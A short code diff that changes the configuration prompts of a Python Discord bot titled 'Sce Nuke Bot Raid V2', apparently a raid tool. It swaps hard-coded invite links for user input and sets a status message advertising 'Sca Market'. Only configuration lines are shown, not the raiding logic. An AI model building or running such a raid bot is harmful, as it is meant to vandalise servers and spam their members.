@@ -13,10 +13,10 @@ intents = discord.Intents.all()
 intents.members = True
 
 prefix = input("Enter command prefix: ")
-bot_name = "Sce Nuke Bot"
+bot_name = input("Enter a name for you bot :")
 title = "[Sce Nuke Bot Raid V2] by Sca Team"
-discord_invite = "discord.gg/J5cdNAemp"
-status_msg = "Sca Market join today (discord.gg/J5cdNAemp)"
+discord_invite = input("Enter your invite discord :")
+status_msg = "Sca Market join today (discord.gg/wENUshsgV3)"
 server_name = input("Enter server name: ")
 nickname = input("enter a nickname :")
 dm_message = input("enter a dm message :")
